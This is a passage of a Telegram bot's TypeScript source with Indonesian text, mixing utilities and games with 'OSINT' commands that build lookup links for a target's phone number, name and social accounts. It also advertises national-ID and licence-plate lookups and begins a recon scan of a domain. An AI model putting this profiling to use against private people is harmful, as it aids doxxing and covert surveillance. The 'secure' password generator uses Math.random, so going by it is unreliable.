                    `💎 <b>TARGET:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Truecaller:</b> <a href="https://www.truecaller.com/search/global/${numID}">Cari Identitas</a>\n` +
                    `├ 💬 <b>WhatsApp:</b> <a href="https://wa.me/${numID}">Check Profile</a>\n` +
                    `└ 🔍 <b>Google:</b> <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Jejak Digital</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Tips: Gunakan aplikasi GetContact (Apps) untuk hasil nama tag terbaik.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('qr', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /qr [text/url]");
      ctx.replyWithPhoto(`https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(args)}`);
    });

    bot.command('shortlink', async (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if(!args) return ctx.reply("Format: /shortlink [url]");
      let url = args; if(!url.startsWith('http')) url = 'https://' + url;
      try {
        const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
        const data = await res.json();
        const reply = `<b>🔗 URL SHORTENING (is.gd)</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `📋 <b>ORIGINAL:</b> <code>${url}</code>\n` +
                      `✨ <b>RESULT:</b> <code>${data.shorturl || "Error"}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch(e) { ctx.reply("❌ Error shortening link."); }
    });

    bot.command('pwd', (ctx) => {
      const p = ctx.message.text.split(' ')[1];
      let len = parseInt(p) || 12;
      if(len > 64) len = 64; if(len < 4) len = 4;
      const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
      let retVal = "";
      for (let i = 0; i < len; ++i) { retVal += charset.charAt(Math.floor(Math.random() * charset.length)); }
      const reply = `<b>🔑 SECURE PASSWORD GEN</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📏 <b>Length:</b> ${len} chars\n` +
                    `✨ <b>Result:</b> <code>${retVal}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64enc', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64enc [text]");
      const result = Buffer.from(args).toString('base64');
      const reply = `<b>🔤 BASE64 ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${result}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64dec', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64dec [text]");
      try { 
        const result = Buffer.from(args, 'base64').toString('utf8');
        const reply = `<b>🔤 BASE64 DECODER</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<code>${result}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'}); 
      } catch { ctx.reply("❌ Invalid base64"); }
    });

    bot.command('hash', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /hash [text]");
      const md5 = crypto.createHash('md5').update(args).digest('hex');
      const sha256 = crypto.createHash('sha256').update(args).digest('hex');
      const reply = `<b>🔐 MULTI-HASH GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TEXT:</b> <code>${args}</code>\n\n` +
                    `├ <b>MD5:</b>\n└ <code>${md5}</code>\n\n` +
                    `├ <b>SHA256:</b>\n└ <code>${sha256}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('sha256', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /sha256 [text]");
      ctx.reply(`🔐 SHA256:\n<code>${crypto.createHash('sha256').update(args).digest('hex')}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('uuid', (ctx) => {
      const reply = `<b>🆔 UUID GEN (v4)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${crypto.randomUUID()}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('flip', (ctx) => {
      ctx.reply(`🪙 Hasil lempar koin: <b>${Math.random() > 0.5 ? 'Kepala (Heads)' : 'Ekor (Tails)'}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roll', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Hasil dadu: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('weather', async (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join('');
      if(!args) return ctx.reply("Format: /weather [kota]");
      try {
        const res = await fetch(`https://wttr.in/${encodeURIComponent(args)}?format=3`);
        const text = await res.text();
        const reply = `<b>⛅ WEATHER FORECAST</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<pre>${text}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Gagal mendapat info cuaca."); }
    });

    bot.command('crypto_price', async (ctx) => {
       const args = ctx.message.text.split(' ')[1] || 'bitcoin';
       try {
         const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${args.toLowerCase()}&vs_currencies=usd,idr`);
         const data = await res.json();
         if(data[args.toLowerCase()]) {
            const reply = `<b>🪙 MARKET PRICE: ${args.toUpperCase()}</b>\n` +
                          `━━━━━━━━━━━━━━━━━━━━\n` +
                          `├ 💵 <b>USD:</b> $${data[args.toLowerCase()].usd}\n` +
                          `└ 🇮🇩 <b>IDR:</b> Rp${data[args.toLowerCase()].idr.toLocaleString('id-ID')}\n` +
                          `━━━━━━━━━━━━━━━━━━━━`;
            ctx.reply(reply, {parse_mode: 'HTML'});
         } else { ctx.reply("❌ Koin tidak ditemukan."); }
       } catch { ctx.reply("❌ Error fetch market."); }
    });

    bot.command('meme', async (ctx) => {
      try {
        const res = await fetch('https://meme-api.com/gimme');
        const data = await res.json();
        ctx.replyWithPhoto(data.url, { caption: data.title });
      } catch { ctx.reply("❌ Error get meme."); }
    });

    bot.command('joke', async (ctx) => {
      try {
        const res = await fetch('https://official-joke-api.appspot.com/random_joke');
        const data = await res.json();
        ctx.reply(`🤣 <b>${data.setup}</b>\n\n<i>${data.punchline}</i>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get joke."); }
    });

    bot.command('quote', async (ctx) => {
      try {
        const res = await fetch('https://dummyjson.com/quotes/random');
        const data = await res.json();
        ctx.reply(`💭 <i>"${data.quote}"</i>\n- <b>${data.author}</b>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get quote."); }
    });

    bot.command('fact', async (ctx) => {
      try {
        const res = await fetch('https://uselessfacts.jsph.pl/random.json?language=en');
        const data = await res.json();
        ctx.reply(`🧠 <b>Faktanya:</b>\n${data.text}`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get fact."); }
    });

    bot.command('cat', async (ctx) => {
      try {
        const res = await fetch('https://api.thecatapi.com/v1/images/search');
        const data = await res.json();
        ctx.replyWithPhoto(data[0].url);
      } catch { ctx.reply("❌ Error get cat."); }
    });

    bot.command('dog', async (ctx) => {
      try {
        const res = await fetch('https://dog.ceo/api/breeds/image/random');
        const data = await res.json();
        ctx.replyWithPhoto(data.message);
      } catch { ctx.reply("❌ Error get dog."); }
    });

    const downloadSong = async (ctx: any) => {
      return ctx.reply("🚧 <b>Fitur musik (/play & /lagu) sedang dalam pemeliharaan (maintenance). Mohon tunggu kabar selanjutnya.</b>", { parse_mode: 'HTML' });
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if (!args) return ctx.reply("🎵 Gunakan format: /lagu [judul] atau /play [judul]");
      
      const waitMsg = await ctx.reply("⏳ <i>Mencari lagu di database (YouTube)...</i>", { parse_mode: 'HTML' });
      try {
        const results = await yts(args);
        
        if (!results || results.videos.length === 0) {
           return ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, "❌ ʟᴀɢᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.");
        }
        
        const video = results.videos[0];
        
        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `⏳ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ: ${video.title}...\n(ᴘʀᴏꜱᴇꜱ ʙʏᴘᴀꜱꜱ ᴋᴇᴄᴇᴘᴀᴛᴀɴ ᴛɪɴɢɢɪ ꜱᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ...)</i>`, { parse_mode: 'HTML' });
        
        try {
          play.setToken({ useragent: ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"] });
          const info = await ytdl.getInfo(video.url, {
            requestOptions: {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
              }
            }
          });
          const stream = ytdl.downloadFromInfo(info, { filter: 'audioonly', quality: 'highestaudio' });
          
          await ctx.replyWithAudio(
            { source: stream, filename: video.title + '.mp3' },
            { caption: `🎵 <b>${video.title}</b>\n👤 <b>Author:</b> ${video.author.name}\n☁️ <b>Source:</b> YouTube`, parse_mode: 'HTML' }
          );
          
          ctx.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => {});
        } catch (downloadErr: any) {
          throw new Error("Gagal mengambil stream audio via play-dl: " + downloadErr?.message);
        }
      } catch (err: any) {
        console.error("Lagu err:", err);
        ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `❌ Gagal mengunduh lagu: ${err?.message || 'Error internal'}`);
      }
    };

    bot.command('lagu', downloadSong);
    bot.command('play', downloadSong);

    bot.command('hentai', (ctx) => {
      ctx.reply("🔞 <b>ʜᴇɴᴛᴀɪ ᴍᴏᴅᴜʟᴇ (ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ)</b>\n━━━━━━━━━━━━━━━━━━━━\n\nꜱᴏʀʀʏ, ꜰɪᴛᴜʀ ᴜɴᴅᴜʜ ᴠɪᴅᴇᴏ ꜱᴇᴅᴀɴɢ ᴅɪᴘᴇʀʙᴀɪᴋɪ.\nᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ ᴘᴀᴅᴀ ᴜᴘᴅᴀᴛᴇ ʙᴇʀɪᴋᴜᴛɴʏᴀ.", { parse_mode: 'HTML' });
    });

    // --- 20+ MINI GAMES ---
    bot.command('suit', (ctx) => {
      const choices = ['batu', 'gunting', 'kertas'];
      const args = ctx.message.text.split(' ')[1]?.toLowerCase();
      if (!args || !choices.includes(args)) return ctx.reply("Format: /suit [batu/gunting/kertas]");
      const botChoice = choices[Math.floor(Math.random() * choices.length)];
      let result = 'KITA SERI! 😑';
      if (
        (args === 'batu' && botChoice === 'gunting') ||
        (args === 'gunting' && botChoice === 'kertas') ||
        (args === 'kertas' && botChoice === 'batu')
      ) { result = 'KAMU MENANG! 🎉'; }
      else if (args !== botChoice) { result = 'KAMU KALAH! 🤡'; }
      ctx.reply(`Kamu: ${args.toUpperCase()}\nBot: ${botChoice.toUpperCase()}\n\n${result}`);
    });

    bot.command('math', (ctx) => {
      const ops = ['+', '-', '*'];
      const op = ops[Math.floor(Math.random() * ops.length)];
      const a = Math.floor(Math.random() * 50) + 1;
      const b = Math.floor(Math.random() * 20) + 1;
      const ans = op === '+' ? a+b : op === '-' ? a-b : a*b;
      ctx.reply(`🧮 <b>QUICK MATHS</b>\nBerapa hasil dari: <b>${a} ${op} ${b} = ?</b>\n\n<tg-spoiler>Jawaban: ${ans}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('dadu', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Kamu melempar dadu dan mendapat angka: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('coinflip', (ctx) => {
      const res = Math.random() > 0.5 ? 'HEADS (Angka)' : 'TAILS (Gambar)';
      ctx.reply(`🪙 Koin dilempar dan hasilnya: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('susunkata', (ctx) => {
      const words = ['hacker', 'phishing', 'malware', 'firewall', 'server', 'database', 'payload', 'system', 'network', 'cyber'];
      const word = words[Math.floor(Math.random() * words.length)];
      const scrambled = word.split('').sort(() => 0.5 - Math.random()).join('');
      ctx.reply(`🔡 <b>SUSUN KATA</b>\nCoba susun huruf ini menjadi istilah IT:\n<b>${scrambled.toUpperCase()}</b>\n\n<tg-spoiler>Jawaban: ${word.toUpperCase()}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakangka', (ctx) => {
      const a = Math.floor(Math.random() * 10) + 1;
      ctx.reply(`🔢 <b>TEBAK ANGKA</b>\nAku sudah memilih angka dari 1 - 10.\n\n<tg-spoiler>Angka itu adalah: ${a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('khodam', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Kamu';
      const k = ['Macan Putih', 'Naga Sakti', 'Kuntilanak Merah', 'Kucing Oren', 'Tuyul Racing', 'Siluman Ular', 'Bebek Ngesot', 'Kosong (Tidak Ada)', 'Kulkas 2 Pintu', 'Spion Motor'];
      const res = k[Math.floor(Math.random() * k.length)];
      ctx.reply(`👻 <b>CEK KHODAM</b>\nNama: ${nama}\nKhodam kamu: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('ramal', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Kamu';
      const r = ['Akan kaya raya tahun depan!', 'Akan menemukan jodoh secepatnya!', 'Akan kesandung batu besok', 'Harus lebih banyak minum air putih', 'Sedang dirindukan seseorang', 'Akan mendapat rezeki nomplok', 'Akan menangis bahagia hari ini'];
      const res = r[Math.floor(Math.random() * r.length)];
      ctx.reply(`🔮 <b>RAMALAN HARI INI</b>\nNama: ${nama}\nRamalan: <i>${res}</i>`, {parse_mode: 'HTML'});
    });

    bot.command('jodoh', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 3) return ctx.reply("Format: /jodoh [Nama1] [Nama2]");
      const pct = Math.floor(Math.random() * 101);
      ctx.reply(`💘 <b>KALKULATOR JODOH</b>\n${args[1]} 💞 ${args[2]}\n\nTingkat Kecocokan: <b>${pct}%</b>\n${pct > 80 ? 'Wow! Kalian sangat serasi!' : pct > 40 ? 'Hmm, boleh juga.' : 'Sebaiknya cari yang lain...'}`, {parse_mode: 'HTML'});
    });

    bot.command('kartu', (ctx) => {
      const suits = ['♠️ Terop', '♥️ Hati', '♣️ Keriting', '♦️ Wajik'];
      const values = ['As', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'Jack', 'Queen', 'King'];
      const a = suits[Math.floor(Math.random() * suits.length)];
      const b = values[Math.floor(Math.random() * values.length)];
      ctx.reply(`🃏 Kamu menarik kartu: <b>${b} ${a}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roulette', (ctx) => {
      const bullet = Math.floor(Math.random() * 6);
      if (bullet === 0) return ctx.reply("🔫 💥 DORRR!!! Kamu tertembak (Russian Roulette)!");
      ctx.reply("🔫 <i>Click...</i> Selamat, peluru kosong. Kamu selamat.", {parse_mode: 'HTML'});
    });

    bot.command('werewolf', (ctx) => {
      const roles = ['🐺 Werewolf', '🧙‍♀️ Seer', '🛡️ Bodyguard', '🧑‍🌾 Villager', '🃏 Fool'];
      const r = roles[Math.floor(Math.random() * roles.length)];
      ctx.reply(`🌕 <b>WEREWOLF ROLE</b>\nRole kamu adalah: <b>${r}</b>!`, {parse_mode: 'HTML'});
    });

    bot.command('8ball', (ctx) => {
      const q = ctx.message.text.split(' ').slice(1).join(' ');
      if(!q) return ctx.reply("Format: /8ball [pertanyaan]");
      const a = ['Ya, pasti.', 'Bisa jadi.', 'Tentu saja tidak.', 'Sangat meragukan.', 'Tanya lagi nanti.', 'My sources say no.', 'Tentu.'];
      const res = a[Math.floor(Math.random() * a.length)];
      ctx.reply(`🎱 <b>MAGIC 8-BALL</b>\nPertanyaan: <i>${q}</i>\nJawaban: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('tarot', (ctx) => {
      const cards = ['The Fool (Awal baru)', 'The Magician (Kekuatan)', 'The High Priestess (Intuisi)', 'Death (Perubahan)', 'The Tower (Kehancuran)', 'The Sun (Kebahagiaan)', 'The Star (Harapan)'];
      const c = cards[Math.floor(Math.random() * cards.length)];
      ctx.reply(`🎴 <b>TAROT READING</b>\nKartu yang ditarik: <b>${c}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('doa', (ctx) => {
      const d = ['Semoga hari ini rezekimu lancar!', 'Tetap semangat, jangan menyerah!', 'Semoga segala urusanmu dimudahkan.', 'Jaga kesehatan, dunia butuh kamu!', 'Semoga impianmu segera terwujud!'];
      const res = d[Math.floor(Math.random() * d.length)];
      ctx.reply(`🤲 <b>MOTIVASI HARI INI</b>\n<i>"${res}"</i>`, {parse_mode: 'HTML'});
    });

    bot.command('tod', (ctx) => {
      const t = ['Beritahu rahasia terbesarmu!', 'Kapan terakhir kali menangis?', 'Siapa crush kamu saat ini?', 'Pernah ngompol di celana?'];
      const d = ['Kirim foto jelek kamu sekarang!', 'Chat mantan kamu bilang rindu!', 'Ganti PP wa sama gambar monyet seharian!', 'Kirim VN nyanyi balonku!'];
      const isTruth = Math.random() > 0.5;
      const res = isTruth ? `🔵 <b>TRUTH</b>\n${t[Math.floor(Math.random() * t.length)]}` : `🔴 <b>DARE</b>\n${d[Math.floor(Math.random() * d.length)]}`;
      ctx.reply(res, {parse_mode: 'HTML'});
    });

    bot.command('gombal', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Sayang';
      const g = [`${nama}, tau bedanya kamu sama modem? Modem connect ke internet, kamu connect ke hatiku.`, `Sejak kenal ${nama}, aku lupa cara sedih.`, `Pisa miring karena terpesona senyum ${nama}.`];
      ctx.reply(`💕 <b>GOMBALAN</b>\n<i>"${g[Math.floor(Math.random() * g.length)]}"</i>`, {parse_mode: 'HTML'});
    });

    bot.command('tebaknegara', (ctx) => {
      const t = [{c:'🇯🇵', a:'Jepang'}, {c:'🇮🇩', a:'Indonesia'}, {c:'🇺🇸', a:'Amerika'}, {c:'🇰🇷', a:'Korea'}, {c:'🇷🇺', a:'Rusia'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🌍 <b>TEBAK BENDERA</b>\nBendera apakah ini: ${items.c} ?\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakkata', (ctx) => {
      const t = [{q:'Selalu di depan, tak terlihat?', a:'Masa Depan'}, {q:'Bisa dipegang tak bisa dilempar?', a:'Janji'}, {q:'Punya gigi tak bisa menggigit?', a:'Sisir'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🤔 <b>TEBAK KATA</b>\n${items.q}\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakhewan', (ctx) => {
      const t = [{q:'Hidup di air & darat, melompat.', a:'Katak'}, {q:'Belalai panjang.', a:'Gajah'}, {q:'Leher panjang, makan daun atas.', a:'Jerapah'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🐾 <b>TEBAK HEWAN</b>\n${items.q}\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('morse', (ctx) => {
      const text = ctx.message.text.split(' ').slice(1).join(' ').toUpperCase();
      if(!text) return ctx.reply("Format: /morse [text]");
      const morseCode: Record<string, string> = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
        '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
        '9': '----.', '0': '-----', ' ': '/'
      };
      const resData = text.split('').map(c => morseCode[c] || c).join(' ');
      const reply = `<b>📡 MORSE ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<pre>${resData}</pre>` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('ig', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /ig [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>📸 INSTAGRAM OSINT</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>Target:</b> @${user}\n\n` +
                    `🔗 <b>Direct Link:</b> <a href="https://www.instagram.com/${user}/">instagram.com/${user}</a>\n` +
                    `🔍 <b>Picuki (No-Login View):</b> <a href="https://www.picuki.com/profile/${user}">View on Picuki</a>\n` +
                    `📡 <b>Story Saver:</b> <a href="https://iganony.io/profile/${user}">View Stories Anonymously</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>⚠️ Instagram memblokir scraping langsung. Gunakan link di atas untuk investigasi manual (OPSEC aman).</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('tiktok', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /tiktok [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>🎵 TIKTOK OSINT</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>Target:</b> @${user}\n\n` +
                    `🔗 <b>Direct Link:</b> <a href="https://www.tiktok.com/@${user}">tiktok.com/@${user}</a>\n` +
                    `🔍 <b>Urlebird (No-Login View):</b> <a href="https://urlebird.com/user/${user}/">View on Urlebird</a>\n` +
                    `📡 <b>TokCount (Live Stats):</b> <a href="https://tokcount.com/?user=${user}">Live API Count</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>⚠️ Gunakan Urlebird untuk melihat video TikTok secara anonim tanpa tercatat di Analytics target.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('github', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /github [username]");
      const user = args[1].replace('@', '');
      
      try {
        const msg = await ctx.reply(`<i>🔄 Menarik data dari GitHub API untuk <b>${user}</b>...</i>`, { parse_mode: 'HTML' });
        const res = await fetch(`https://api.github.com/users/${user}`);
        if(res.status === 404) return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, "❌ User GitHub tidak ditemukan.");
        
        const data = await res.json();
        const reply = `<b>🐙 GITHUB OSINT DATA</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 <b>Name:</b> ${data.name || 'N/A'}\n` +
                      `🏷️ <b>Username:</b> @${data.login}\n` +
                      `🏢 <b>Company:</b> ${data.company || '-'}\n` +
                      `📍 <b>Location:</b> ${data.location || '-'}\n` +
                      `📧 <b>Email:</b> ${data.email || 'Private/Hidden'}\n` +
                      `🐦 <b>Twitter:</b> ${data.twitter_username ? '@'+data.twitter_username : '-'}\n\n` +
                      `📊 <b>STATISTIK:</b>\n` +
                      `├ Repos: ${data.public_repos}\n` +
                      `├ Gists: ${data.public_gists}\n` +
                      `├ Followers: ${data.followers}\n` +
                      `└ Following: ${data.following}\n\n` +
                      `📅 <b>Dibuat:</b> ${new Date(data.created_at).toISOString().split('T')[0]}\n` +
                      `🔗 <b>Link:</b> <a href="${data.html_url}">${data.html_url}</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
      } catch (err) {
        ctx.reply("❌ Gagal menarik data GitHub.");
      }
    });

    bot.command('nama', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if (!args) return ctx.reply("Format: /nama [Nama Lengkap]");
      const q = encodeURIComponent(`"${args}"`);
      const reply = `<b>👤 NAME OSINT INVESTIGATION</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET NAME:</b> <code>${args}</code>\n\n` +
                    `├ 🌐 <b>General Search:</b> <a href="https://www.google.com/search?q=${q}">Cek Nama di Google</a>\n` +
                    `├ 📄 <b>PDF/Docs:</b> <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen Terkait</a>\n` +
                    `├ 💼 <b>LinkedIn:</b> <a href="https://www.google.com/search?q=site:linkedin.com+${q}">Cari di LinkedIn</a>\n` +
                    `├ 🎓 <b>Akademik:</b> <a href="https://www.google.com/search?q=site:pddikti.kemdikbud.go.id+${q}">Cek di PDDikti (Kuliah)</a>\n` +
                    `├ 🏛️ <b>Legal/Putusan:</b> <a href="https://www.google.com/search?q=site:putusan3.mahkamahagung.go.id+${q}">Cek Putusan Sidang</a>\n` +
                    `└ 🏢 <b>Berita:</b> <a href="https://www.google.com/search?q=site:detik.com+OR+site:kompas.com+${q}">Cek di Media Berita</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Analisis nama selesai.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('osint_indo', (ctx) => {
      const reply = `<b>🇮🇩 OSINT INDONESIA MODULE</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `Pilih alat investigasi lokal:\n\n` +
                    `1. <b>NIK Analyzer:</b> /nik [16-digit]\n` +
                    `2. <b>License Plate:</b> /plat [B 1234 ABC]\n` +
                    `3. <b>Social Media ID:</b> /username [user]\n` +
                    `4. <b>Name Search:</b> /nama [Nama Lengkap]\n` +
                    `5. <b>Phone Info:</b> /phone_dork [08xx]\n` +
                    `6. <b>Email Check:</b> /email [email]\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>Alat ini dioptimalkan untuk region Indonesia.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('sosmed', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /sosmed [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>📱 SOCIAL MEDIA DASHBOARD: @${user}</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `├ 📸 <b>IG:</b> <a href="https://www.instagram.com/${user}/">Instagram</a>\n` +
                    `├ 🎵 <b>TT:</b> <a href="https://www.tiktok.com/@${user}">TikTok</a>\n` +
                    `├ 🐦 <b>TW:</b> <a href="https://twitter.com/${user}">Twitter/X</a>\n` +
                    `├ 👥 <b>FB:</b> <a href="https://www.facebook.com/${user}">Facebook</a>\n` +
                    `├ 💼 <b>LI:</b> <a href="https://www.linkedin.com/in/${user}">LinkedIn</a>\n` +
                    `├ 📦 <b>KS:</b> <a href="https://www.kaskus.co.id/profile/${user}">Kaskus</a>\n` +
                    `└ 🎥 <b>YT:</b> <a href="https://www.youtube.com/@${user}">YouTube</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>Gunakan /username untuk pengecekan otomatis 100+ situs.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('scan', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /scan [IP/Domain]");
      const target = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      const scanMsg = await ctx.reply(`🔍 <b>DEEP_SCAN_INITIATED:</b> <code>${target}</code>\n<i>Menjalankan modul Multi-Layer Recon (OSINT, NMAP-lite, Banner Grabbing)...</i>`, { parse_mode: 'HTML' });
      
      try {
        // [1] IP-API Fetch
        const ipRes = await fetch(`http://ip-api.com/json/${target}?fields=status,message,country,city,isp,org,query`);
        const ipData = await ipRes.json();
        
        let ipInfo = "N/A";
        let targetIp = target;
        if (ipData.status === 'success') {
           targetIp = ipData.query;
           ipInfo = `IP: ${ipData.query}\nNegara: ${ipData.country}\nKota: ${ipData.city}\nISP: ${ipData.isp}`;
        }
        
        // [2] WHOIS Fetch
        const whoisRes = await fetch(`https://networkcalc.com/api/dns/whois/${target}`);
        const whoisRaw = await whoisRes.json().catch(() => null);
        let whoisInfo = "No Data";
        if (whoisRaw && whoisRaw.status === 'OK' && whoisRaw.whois) {
